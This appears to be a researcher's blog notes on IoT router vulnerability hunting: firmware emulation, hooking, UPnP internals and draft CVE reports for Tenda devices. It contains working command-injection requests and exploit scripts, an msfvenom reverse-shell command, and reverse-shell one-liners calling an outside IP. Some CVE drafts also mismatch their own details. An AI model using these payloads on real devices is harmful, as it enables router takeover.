---
title: IOT 漏洞挖掘记录
date: 2023-04-24 00:28:59 +0800
categories: 
tags:
  - pwn
permalink: /posts/id=62/
pin: false
published:
---

主要是在学习的过程中记录一些笔记

## 资源下载

各大厂商的下载地址

Tenda: https://www.tenda.com.cn/download/default.html

D-Link: 

https://tsd.dlink.com.tw/

https://support.dlink.com/

https://www.dlinktw.com.tw/techsupport/AllPro.aspx

TP-Link: https://resource.tp-link.com.cn/?source=index

华为: https://support.huawei.com/enterprise/zh/software/index.html

NETGEAR/网件: http://support.netgear.cn/

ASUS/华硕: https://www.asus.com.cn/support/download-center/

cisco/思科: https://software.cisco.com/download/home

linksys/领势: https://www.linksys.com/linksys-support

H3C: http://www.h3c.com/cn/Service/Document_Software/Software_Download/

FAST迅捷: https://service.fastcom.com.cn/download-list.html

水星: https://service.mercurycom.com.cn/download-list.html

OpenWrt: https://downloads.openwrt.org/

海康威视: https://www.hikvision.com/cn/support/Downloads/Device-upgrade-package/

**官网没有固件下载链接**

到第三方下载 https://drivers.mydrivers.com/s-0-0/h0-0-0-0-3-1-1.htm

小米: https://xiaomifirmwareupdater.com/、https://mirom.ezbox.idv.tw/en/

Cisco/思科: https://doc.lagout.org/network/Cisco/


```Bash
armel:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/armel/debian_wheezy_armel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/armel/initrd.img-3.2.0-4-versatile
wget https://people.debian.org/~aurel32/qemu/armel/vmlinuz-3.2.0-4-versatile
# 2.6.32
wget https://people.debian.org/~aurel32/qemu/armel/debian_squeeze_armel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/armel/initrd.img-2.6.32-5-versatile
wget https://people.debian.org/~aurel32/qemu/armel/vmlinuz-2.6.32-5-versatile

armhf:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress
wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress

mipsel:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta

# 2.6.32
wget https://people.debian.org/~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-2.6.32-5-4kc-malta

mips:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/mips/debian_wheezy_mips_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta

# 2.6.32
wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta
```


## 黑客👴

w18劫持测试

```http
POST /goform/module?1696930571226 HTTP/1.1
Host: 192.168.0.1
Content-Length: 73
Accept: text/plain, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.1

Referer: http://192.168.0.1/index.html?v=1576
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

Cookie: _:USERNAME:_=; W18E_user=; bLanguage=cn
Connection: close

{"setFixTools":{"networkTool":1,"hostName":"{"setFixTools":{"networkTool":1,"hostName":"$(touch /tmp/tmptmptmp)","packageSize":32}}","packageSize":32}}
```





近源渗透

https://tttang.com/archive/1888/#toc_wifi_1

wifipumpkin3

https://www.freebuf.com/sectool/265288.html

https://www.addx.top/2023/06/30/wifi%E9%92%93%E9%B1%BC%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/

https://lnng.top/posts/8b06.html#toc-heading-2







https://www.cnblogs.com/xs-xs/p/16329075.html

DHCP

https://blog.csdn.net/zegeai/article/details/109760837



## IOT的技术栈📕



利用前



利用后
获取密码

劫持DNS





### 备忘录



git rm -r --cached /path/to/your/folder/


找到危险函数以后一定要全局搜索，grep

url编码意味着填充 %25 == 

/goform/telnet

 Nginx 配置 internal;

```


_xstat 函数是一个用于获取文件或文件夹的详细信息的系统调用
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

int main() {
    const char *file_path = "example.txt";
    struct stat file_stat;

    // 使用 _xstat 获取文件信息
    if (_xstat(_STAT_VER, file_path, &file_stat) == 0) {
        printf("File Size: %lld bytes\n", (long long)file_stat.st_size);
        printf("Permissions: %o\n", file_stat.st_mode & 0777);
        // 其他文件信息...
    } else {
        perror("Error getting file information");
    }

    return 0;
}



```


### ghidra快捷键

L	修改标签修改名字


### msf生成shellcode

```shell
msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=192.168.55.5 LPORT=2333 -f py -o mipsel919.txt
# # 不指定-f参数的话，生成了一个shellcode二进制文件。指定-f py生成的文件，方便写脚本使用
# 使用方法就是
# 溢出 + shellcode_addr + xxx + shellcode

# payload按tab会加载

msfvenom --list payloads | grep mipsle
```


### 编译tcpdump  和 busybox
下载tcpdump和libpcap：https://www.tcpdump.org/

mipsel版
```shell
sudo apt install gcc-mipsel-linux-gnu

# libpcap
tar zxvf libpcap-1.10.4.tar.gz
./configure --host=mipsel-linux-gnu --disable-shared
make CC=mipsel-linux-gnu-gcc

# tcpdump

在tcpdump.c中添加 #include <fcntl.h>

./configure --host=mipsel-linux-gnu CPPFLAGS="-I/home/ef4tless/libpcap-1.10.4" LDFLAGS="-L/home/ef4tless/libpcap-1.10.4/libpcap.a -static"
make

./tcpdump -i lo -w ./test.pcap

# 提取pcap包

cat /tmp/test.pcap  | /tmp/busybox-mipsel base64 

然后复制base64的值到本地pcap64

cat pcap64 | base64 -d > test.pcap 
```






### mqtt
mqtt与ubus的安全问题：https://gtrboy.github.io/posts/bus/#0x01-mqtt%E5%8D%8F%E8%AE%AE
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231226200717.png)

消息总线机制有MQTT协议以及ubus系统。其中MQTT作为一种应用层协议，不仅可以实现设备和应用（如APP、Web管理系统）之间远程通信，也可以将MQTT代理开放在设备内部实现进程间通信
MQTT协议基于订阅/发布模型

代理即MQTT服务器




### so库的另类加载

有时候对库函数的引用可能是通过dlopen

```
dlopen(const char *filename, int flags)
```

需要指定路径和文件名，如果说搜不到调用so的文件，有可能是数组遍历的方式拼接so文件的路径

例如：要搜索调用lib/cste_modules/system.so的二进制文件
可以搜索lib/cste_modules，然后就能找到最有可能的调用文件了




### /etc/passwd and /etc/shadow
```
root: $6$9w5Td6lg$bgpsy3olsq9WwWvS5Sst2W3ZiJpuCGDY.4w4MRk3ob/i85fl38RH15wzVoomff9isV1 PzdcXmixzhnMVhMxbvO:15775:0:99999:7:::


用户名：             加密密码：         最后一次修改时间：最小修改时间间隔：密码有效期：密码需要变更前的警告天数：密码过期后的宽限时间：账号失效时间：保留字段
```


采用SHA512 散列加密算法或者MD5

可以在https://www.cmd5.com/charge.aspx解密

### 加密固件处理


### patch & hook

HOOK一共有四种方法，分别是

+ LD_PRELOAD
+ dl_open
+ LD_LIBRARY_PATH
+ 直接针对二进制文件的patch

```shell
# 查看libc 信息
cp $(which qemu-arm-static) .
sudo chroot . ./qemu-arm-static /lib/libc.so.6
or
strings ./lib/libc.so.0 | grep uClibc
```
### dl_open

```
mv libnvram.so libnvram_orig.so

```



### LD_PRELOAD

```shell
# glibc/eglibc编译 
arm-linux-gnueabi-gcc -shared -fPIC hook.c -o hook.so 


# uclibc 编译
cd ~/am-toolchains/brcm-arm-sdk/
export LD_LIBRARY_PATH="$PWD/hndtools-arm-linux-2.6.36-uclibc-4.5.3/lib"
# 基于 nvram_fake
./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -c -O2 -fPIC -Wall /home/ef4tless/nvram-faker/custom_nvram_r6250.c -o /home/ef4tless/nvram-faker/custom_nvram_r6250.o

./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -shared -nostdlib /home/ef4tless/nvram-faker/custom_nvram_r6250.o -o /home/ef4tless/nvram-faker/custom_nvram_r6250.so

# 基于 libnvram
./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -c -O2 -fPIC -Wall /home/ef4tless/libnvram/nvram.c -o /home/ef4tless/libnvram/firmadyne_nvram.o

./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -shared -nostdlib /home/ef4tless/libnvram/firmadyne_nvram.o -o /home/ef4tless/libnvram/firmadyne_libnvram.so


# 上传
scp ./hook.so root@192.168.2.2:/root/rootfs/

scp ./mini_httpd root@192.168.2.2:/root/rootfs/usr/sbin
```



```shell
# 运行
LD_PRELOAD=./hook.so ./usr/sbin/mini_httpd
# 注入环境变量
export LD_PRELOAD=./hook.so


# qemu usr mode / strace追踪
sudo chroot . ./qemu-arm-static ./usr/sbin/upnpd
sudo chroot . ./qemu-arm-static -strace ./usr/sbin/upnpd

sudo chroot . ./qemu-arm-static -E LD_PRELOAD="./custom_nvram_r6250.so ./lib/libdl.so.0" /usr/sbin/upnpd

sudo chroot . ./qemu-arm-static -E LD_PRELOAD="/firmadyne_libnvram.so" ./usr/sbin/upnpd



# 查看启动端口
sudo lsof -i | grep qemu


# 按字符串搜索
cd rootfs
grep -r "mini_httpd" ./

```




```shell
# start.sh

mipsel:
qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_wheezy_mipsel_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" \
    -netdev tap,id=tapnet,ifname=tap0,script=no \
    -device rtl8139,netdev=tapnet -nographic
    
mips:
qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_wheezy_mips_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" \
    -netdev tap,id=tapnet,ifname=tap0,script=no \
    -device rtl8139,netdev=tapnet -nographic
    
armel:
qemu-system-arm \
    -M versatilepb \
    -kernel vmlinuz-3.2.0-4-versatile \
    -initrd initrd.img-3.2.0-4-versatile \
    -hda debian_wheezy_armel_standard.qcow2 \
    -append "root=/dev/sda1" -net nic \
    -net tap,ifname=tap0,script=no,downscript=no \
    -nographic

armhf:
qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \
    -initrd initrd.img-3.2.0-4-vexpress \
    -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \
    -append "root=/dev/mmcblk0p2" -net nic \ 
    -net tap,ifname=tap0,script=no,downscript=no -nographic
    
arm64:
```



GDB调试

```
# gdbserver


gdb







```



### 挖掘技巧tips和知识点

```sh
sudo vim /etc/ssh/sshd_config
PasswordAuthentication改成yes

vsnprintf(str, 0x400u, format, va);
按照format的格式（%s），将va传入str

例如 va是栈上列表/format为%S %S %S
+0000000C filename:.word ?
+00000010 re_addr:.word ?
+00000014 re_port:.word ?

str为 filename re_addr re_port

ida查找字段 Alt+t

fopen函数的mode参数有以下几种：
"r"：以只读方式打开文件。文件必须存在，否则打开失败。
"w"：以写方式打开文件。如果文件不存在，则创建文件；如果文件已存在，则清空文件内容。
"a"：以追加方式打开文件。如果文件不存在，则创建文件；如果文件已存在，则在文件末尾追加内容。
"r+"：以读写方式打开文件。文件必须存在，否则打开失败。
"w+"：以读写方式打开文件。如果文件不存在，则创建文件；如果文件已存在，则清空文件内容。
"a+"：以读写方式打开文件。如果文件不存在，则创建文件；如果文件已存在，则在文件末尾追加内容。
除了以上六种模式外，还可以在模式字符串中添加"b"字符，表示以二进制方式打开文件。例如，"rb"表示以只读方式打开二进制文件。

bash脚本`ls`命令执行
使用 && 连接两个命令时，第二个命令只有在第一个命令成功执行（即返回状态码为0）之后才会执行

用FAP启动好固件后，需要用echo 0 > /proc/sys/kernel/randomize_va_space命令关闭地址随机化（ASLR）

# 在当前目录查找
grep -r "CVE-2022-45511" ./
```



hnap

upnp

```
cgibin会作为 “请求验证文件” ，对用户的请求进行验证并解析，再将解析后的数据传给对应的文件，进行下一步的操作。

SSDP（简单服务发现协议），SOAP（简单对象访问协议）与GENA（通用事件通知体系） ，其分别对应ssdpcgi（在/htdocs/upnp目录下），soap.cgi（在/htdocs/upnp/docs/LAN-1目录下），gena.cgi（在/htdocs/upnp/docs/LAN-1目录下）


/usr/sbin/upnp 中则包含了请求规则
```

SSDP

```
调用端口查询
/var/run/httpd.conf



# 称为HTTPU协议（即基于UDP的HTTP）


M-SEARCH * HTTP / 1.1  
host：239.255.255.250 ：1900  
MAN：ssdp：discover  
MX：10  
ST：ssdp:all

UUID
Universally Unique Identifier，通用唯一识别码。目的是让分布式系统中的所有元素，都有唯一辨识咨询，定义格式为：xxxxxxxx-xxxx-xxxx-xxxxxxxxxxxxxxxx(8-4-4-16),分别为当前日期和时间，时钟序列，全局唯一的IEEE机器识别号，如果有网卡，从网卡mac地址获得，没有网卡以其他方式获得。
UDN
单一设备名（Unique Device Name），基于UUID，表示一个设备。在不同的时间，对于同一个设备此值应该是唯一的。
URN
URL的一种更新形式，统一资源名称(URN,Uniform Resource Name)。唯一标识一个实体的标识符，但是不能给出实体的位置。标识持久性Internet资源。URN可以提供一种机制，用于查找和检索定义特定命名空间的架构文件。尽管普通的URL可以提供类似的功能，但是在这方面，URN 更加强大并且更容易管理，因为 URN 可以引用多个 URL。
Mx
1到5之间的一个值，表示最大的等待应答的秒数。
ST
Seatch Targer，表示搜索的节点类型。

# 应答
HTTP/1.1 200 OK\r\n
CACHE-CONTROL: max-age=120\r\n
ST: uuid:75802409-bccb-40e7-8e6c-40a5ef100e92\r\n
USN: uuid:75802409-bccb-40e7-8e6c-40a5ef100e92\r\n
EXT:\r\n
SERVER: RT-N56U/3.4.3.9 UPnP/1.1 MiniUPnPd/2.0\r\n
LOCATION: http://192.168.100.1:24795/rootDesc.xml\r\n
OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01\r\n
01-NLS: 1652586384\r\n
BOOTID.UPNP.ORG: 1652586384\r\n
CONFIGID.UPNP.ORG: 1337\r\n
\r\n
```

gena

```
SUBCRIBE

request = b"SUBSCRIBE /gena.cgi?service=" + b"`telnetd -p 7777`" + b" HTTP/1.1\r\n"
request += b"Host: localhost:49152\r\n"
request += b"Callback: http:///\r\n"
request += b"NT: upnp:event\r\n"
request += b"Timeout: Second-2333\r\n\r\n"
service=后面的内容，再先看到SUBCRIBE请求方式对应的sub_41A390函数：
```



soap

```
from socket import *
from os import *
from time import *
 
request = b"POST /soap.cgi?service=&&telnetd -p 8888&& HTTP/1.1\r\n"
request += b"Host: localhost:49152\r\n"
request += b"Content-Type: text/xml\r\n"
request += b"Content-Length: 88\r\n"
request += b"SOAPAction: a#b\r\n\r\n"
```



### 基础知识

windows dns刷新

```shell
ipconfig /flushdns
```





### 网络编程

参考：https://nuoye-blog.github.io/2020/05/20/6e2d1109/

`socket(2, 2, 0)` 
调用创建了一个IPv4(AF_INET，因为第一个参数是2)的流式套接字(SOCK_STREAM，因为第二个参数是2)，第三个参数指定的是使用默认的协议(通常是TCP)。

bind绑定到servaddr，相应的IP端口

```c
bind(socket_fd, (struct sockaddr*)&servaddr, sizeof(servaddr)
```

listen监听端口

```C
listen(socket_fd, 10)
```



connect用于连接到指定servaddr的

```c
connect(socket_fd, (struct sockaddr*)&servaddr, sizeof(servaddr)
```









` 0x7F000001` 表示使用回环地址(127.0.0.1)





### 病毒分析

| Sha256   | 81f67502d9cf92a9ff03b2f3837ae1cdda7db8e9624ad82106723b520c43fe5a |
| -------- | ------------------------------------------------------------ |
| SHA1     | cc7af791ac2a977d5d6a4609fc4438085d0becd5                     |
| MD5      | 63374c5d751d2648c578b46eb6573958                             |
| 文件类型 | EXE                                                          |
| 文件大小 | 24.65MB                                                      |
| 文件名称 | 集团终端自检工具第一版.exe                                   |
| 功能描述 | Sliver木马                                                   |
| 技术特点 | 经分析该木马是一个加壳的Sliver。                             |

### 权限绕过

1. 空密码绕过
利用strlen、strcmp、printf  \x00截断，使得if判断返回1

2. fopen空读入返回为0

3. url解码后，%00后边被截断，拼接无权限限制的接口实现越权访问

4. 目录穿越，白名单字符串比对，strncasecmp()，一旦存在白名单路径比对，就可以结合目录穿越

5. 重置密码绕过

6.csrf



### 命令注入

#### 常见危险函数
php
- system
- exec
- passthru
- shell_exec
- popen
- proc_open

python
- system
- popen
- subprocess.call
- spawn

java
- java.lang.Runtime.getRuntime().exec(command)



#### 可注入分割符和注入命令

__单引号要闭合__! 因为单引号中，\`\` 和 $ 和 ；不会被识别执行，双引号分号识别不了


```shell
#  可注入分割符
%0a
%0d 
;
&
|
$(shell_command)
`shell_command`
{shell_command,}
```

1、分号`;`分割


2、`||` `&&` `&` `|`分割

  ||(或者)当前面的执行出错时执行后面的

  &&(和)当前一条命令执行成功后面的命令才会执行

  &将前边的命令放在后台执行
  
  | 管道符  显示后面的命令的执行结果

3、`\r\n` `%0d%a0` 换行

主要用于报文里拼接
%0a 即 \n
%0d 即 \r

4、反引号解析和 `$()` 替换

如果在一条命令中出现了反引号，系统会首先执行反引号内的命令，然后将执行结果作为xclibc的参数

5、额外的一些拼接

双大括号字符组合输出

cat {./te,st}{st,st}
to
./test test stst stst

\> 用于重定向，如果目标文件已经存在则覆盖其中的内容


注入命令
```shell

wget dnslog.cn

telnetd

sh -c "sh -i >& /dev/tcp/150.158.144.112/1234 0>&1"\x00

```

telnet反弹，防止没有telnetd

```shell
'$(mkfifo /tmp/test;telnet 192.168.45.66 6666 0</tmp/test|/bin/sh > /tmp/test)'
```

### 正则分析

```php
$reg = "/^(http(s?):\/\/){0,1}(?:[A-za-z0-9-]+\.)+[A-Za-z]{2,4}(?:[\/\?#][\/=\?%\-&~`@[\]\':+!\.#\w]*)?$/";
```


\* : 表示匹配前面的字符集零次或多次。
\+ : 表示量词，匹配前边的字段一次或多次
[] 表示字符集
（）将捕获的结果作为一个整体才是捕获组的真实含义
%.   表示匹配.   %用于表示特殊字符
^:  不是： 非的意思
.* ：匹配任意字符





1. **定界符**：

   - 正则表达式通常被定界符包围，这里使用的是正斜线 `/`。定界符可以是任意非字母数字、非反斜线、非空白字符。

2. **开始 (`^`) 和结束 (`$`) 锚点**：

   - `^` 表示正则表达式应该从字符串的开始处开始匹配。
   - `$` 表示正则表达式应该在字符串的结尾处结束。
   - 这两个符号确保整个字符串完全符合正则表达式的模式。

3. **协议匹配**：

   - `(http(s?):\/\/){0,1}` 用于匹配 URL 的协议部分。
   - `http` 后面的 `(s?)` 表示 's' 字符可有可无，用于匹配 'http' 或 'https'。
   - `:\/\/` 是对冒号和两个正斜线的直接匹配。
   - `{0,1}` 表示前面的整个模式可以出现 0 次或 1 次。

4. **域名匹配**：

   - `(?:[A-Za-z0-9-]+\.)+` 匹配域名。
   - `[A-Za-z0-9-]+` 匹配一个或多个字母、数字或连字符。
   - `\.` 匹配点号（`.`）。在正则表达式中，点号通常表示任意字符，所以需要用反斜线转义。
   - 后面的 `+` 表示前面的模式（即一个标签，如 `example`）可以出现一次或多次。

5. **顶级域名匹配**：

   - `[A-Za-z]{2,4}` 匹配顶级域名（如 `.com`、`.net`）。
   - `{2,4}` 表示前面的字符模式至少出现 2 次，最多出现 4 次。

6. **可选的 URL 部分**：

   - `(?:[\/\?#][\/=\?%\-&~`@[]':+!.#\w]*)?` 用于匹配 URL 的路径、查询参数等可选部分。
   - `[\/\?#]` 首先匹配一个正斜线、问号或井号。
   - 后面的部分 `[\/=\?%\-&~`@[]':+!.#\w]*` 匹配 URL 中可能出现的各种字符，包括斜线、等号、百分号、连字符等。
   - `*` 表示前面的模式可以出现任意次，包括零次。
   - 最后的 `?` 表示这整个部分是可选的。

   

1. **分组** (`()`):
   - 在正则表达式中，圆括号用于创建分组。这允许您将多个字符或表达式组合在一起，以便对整个组执行操作（如重复、匹配等）。
   - 分组还有一个附加功能：它们可以捕获匹配的内容，这意味着您可以在正则表达式的其余部分或者在替换操作中引用这部分匹配的文本。
2. **非捕获分组** (`(?:...)`):
   - 有时候，您只需要分组的组合功能，而不需要捕获功能。在这种情况下，就可以使用非捕获分组。
   - 在分组的开始加上 `?:`（紧跟在左圆括号后面）来创建一个非捕获分组。这样，正则表达式引擎就不会保存这个分组匹配的内容，从而节省资源。

在正则表达式中，`\w` 匹配任何字母数字字符，包括下划线。这意味着它匹配所有的小写和大写字母（a-z, A-Z）、数字（0-9）以及下划线（\_）。


### UPNP

SSDP
SSDP使用一个固定的组播地址239.255.255.250和UDP端口号1900来监听其他设备的请求。
```http
M-SEARCH * HTTP/1.1
S:uuid:ijklmnop-7dec-11d0-a765-00a0c91e6bf6
Host:192.168.1.254:1900
Man:"ssdp:discover"ST:ge:fridge
MX:3
```

```python
from socket import *
from os import *
from time import *
 
payload = b'M-SEARCH * HTTP/1.1\r\n'
payload += b'HOST:localhost:1900\r\n'
payload += b'ST:urn:device:;telnetd -p 8888\r\n\r\n'
 
s = socket(AF_INET, SOCK_DGRAM, 0)
s.sendto(payload, ("192.168.10.1", 1900))
s.close()
 
sleep(1)
system("telnet 192.168.10.1 8888")
```


```python
import socket
from time import sleep

def exp(server, port, shell_file):
    print('\n[*] Connection {host}:{port}').format(host=server, port=port)
    
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    request = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\n"
    request += "Host: " + str(server) + str(port) + "\n"
    request += "Callback: <http://192.168.0.2/>\n"
    request += "NT: upnp:event\n"
    request += "Timeout: Second-infinite Second-1800\n"
    request += "Accept-Encoding: gzip, deflate\n"
    request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"
    sleep(1)
    print('[*] Sending Payload')
    con.connect((socket.gethostbyname(server),port))
    con.send(request.encode())
    
    results = con.recv(4096)

exp('192.168.0.1', 49152, '`touch /flag4`')

```


## 路由器一篮子流程+总结🐄

###  固件解包

dd命令
```shell
dd if=输入文件 of=输出文件 bs=1 skip=xxx count=xxx

# bs=1 即一字节大小
# skip跳过输入文件的前xxx个块   1块 1字节

# count复制多少个块 字节

# binwalk第一列是开始的字节数

dd if=TL-AP1202C-PoE\ V1.0_1.0.5_Build_20201221_Rel.52389.bin of=F500.raw bs=1 skip=62720 count=854196


dd if=TL-AP1202C-PoE\ V1.0_1.0.5_Build_20201221_Rel.52389.bin of=400.raw bs=1 skip=1024 count=61696
```

#### Vxworks固件

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231220133415.png)

uboot头中可能带有起始地址，可以提取出来搜索uimage
或者设置默认基地址为0，找sp寄存器赋值的参数即为基地址

其中最大的size就是运行程序的部分

```shell
binwalk -Y F500 # 查看架构
```

提取符号表

```shell
grep -r "bzero"
```

#### 一般固件

函数名和函数地址(符号表)在bss段的情况，使用插件fix code



### 启动固件

统计所有接口



危险函数

```shell
os.execute, forkExec, io.popen
```

`[%w_-]+`: 这是一个字符类模式。

在 Lua 中，`%w` 匹配所有字母和数字，`_` 匹配下划线字符，`-` 匹配连字符。方括号 `[]` 创建一个字符集，匹配集合中的任意单个字符。加号 `+` 表示匹配字符集中的一个或多个字符。


qemu模拟

```shell
# 用户级qemu
sudo cp $(which qemu-arm-static) .
# sudo cp $(which qemu-mipsel-static) .
# sudo chroot . ./qemu-arm-static /lib/libc.so.6
sudo chroot . ./qemu-arm-static /bin/httpd

#-------------------------------------------------------------------
# 系统级qemu（桥接）
# 配置本机网卡
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.2.1/24

# 启动虚拟机
./start.sh
# qemu内网络配置
ifconfig eth0 192.168.2.2
# ifconfig eth1 192.168.2.2
service ssh start

# 上传文件系统-主机
tar czf rootfs.tar.gz ./rootfs
sudo scp ./rootfs.tar.gz root@192.168.2.2:/root/

# 上传文件系统-qemu
tar -zxvf ./rootfs.tar.gz
chmod -R 777 ./rootfs
# chmod -R 777 ./squashfs-root

# 挂载文件系统
mount -o bind /dev ./rootfs/dev && mount -t proc /proc ./rootfs/proc
# mount -o bind /dev ./squashfs-root/dev && mount -t proc /proc ./squashfs-root/proc
# mount -o bind /dev ./cpio-root/dev && mount -t proc /proc ./cpio-root/proc
chroot ./rootfs sh
# chroot ./squashfs-root sh
```

### 分析总结

#### cgi

www/cgi-bin/下各种cgi分别管理各个功能，或者由一个大的cgibin统合所有功能用软链接的形式

#### luci
是一个lua框架，一般在www/cgi-bin下有一个luci脚本
usr/lib/lua/luci 目录下是全部的函数功能lua，controller就是主要的路由控制器

lua luci框架搜索路由

```shell
grep -Rs "entry({\"api"
grep -Rs "entry({"
```


#### nginx

路由由配置文件决定

## CVE提交本地表单

提交平台：https://cveform.mitre.org/

简单描述：
Tenda W30E V16.01.0.12(4843) was discovered to contain a stack overflow via the function formAdvancedSetListSet.

Tenda W30E V16.01.0.12(4843) was discovered to contain a command injection vulnerability via the function setUmountUSBPartition.



### AX12+AX9

1
__Vulnerability type__
Command injection

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
AX9 V22.03.01.46

__Impact__
Code Execution

Code Execution/Denial of Service
__Affected component(s)__
In the /goform/SetNetControlList feature, the list parameter is passed to sscanf without validation and then further passed to update_dev_name, it is concatenated with an SQL command in snprintf, leading to command injection.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/AX9/SetNetControlList-2.md
__Suggested description of the vulnerability for use in the CVE__
Tenda AX9 V22.03.01.46 has been discovered to contain a SQL command injection vulnerability in the 'list' parameter at /goform/SetNetControlList.
__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd

2
__Vulnerability type__
Command injection

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
AX9 V22.03.01.46

__Impact__
Code Execution

Code Execution/Denial of Service
__Affected component(s)__
In the `/goform/SetNetControlList` function, the `list` parameter is passed to `sscanf` without validation and then further passed to `add_tc_traffic_control`.Inside this function, command concatenation occurs in `snprintf`.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/AX9/SetNetControlList-3.md
__Suggested description of the vulnerability for use in the CVE__
Tenda AX9 V22.03.01.46 has been discovered to contain a command injection vulnerability in the 'list' parameter at /goform/SetNetControlList.
__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd


3
__Vulnerability type__
Command injection

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
AX9 V22.03.01.46

__Impact__
Code Execution

Code Execution/Denial of Service
__Affected component(s)__
In the `/goform/SetOnlineDevName` feature, the `mac` parameter is passed to the `update_dev_name` function without validation. This parameter is concatenated with an SQL command in `snprintf`, leading to a command injection vulnerability.

__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/AX9/SetNetControlList.md
__Suggested description of the vulnerability for use in the CVE__
Tenda AX9 V22.03.01.46 has been found to contain a stack overflow vulnerability in the 'list' parameter at /goform/SetNetControlList.
__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd

4
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
AX9 V22.03.01.46

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the /goform/SetNetControlList function, passing a value to the list parameter assigns it to v1. This then leads to a call to the sub_43FBBC function. Within this function, the strcpy function triggers a stack overflow.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/AX9/SetOnlineDevName.md
__Suggested description of the vulnerability for use in the CVE__
Tenda AX9 V22.03.01.46 has been discovered to contain a SQL command injection vulnerability in the 'mac' parameter at /goform/SetOnlineDevName.
__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd


### i29

v1.0 V1.0.0.5 and  v1.0 V1.0.0.2

1
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the lanCfgSet function, a stack overflow may occur when the value of parameter v8 is excessively large and is passed to the lanGw parameter in the strcpy function.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/lanCfgSet.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a stack overflow via the function formAdvancedSetListSet.

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd


2
__Vulnerability type__
Command injection

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Code Execution

Code Execution/Denial of Service
__Affected component(s)__
In the pingSet function, the concatenated command is stored in the v23 variable, and then it is passed to the cmd_get_ping_output function. Due to the lack of special character filtering, this could lead to command injection vulnerabilities.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/pingSet-2.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a command injection vulnerability via the function pingSet.

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd


3
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the pingSet function, a stack overflow may occur when the value of the pingIp parameter is excessively large and is passed to a stack variable using the strcpy function.
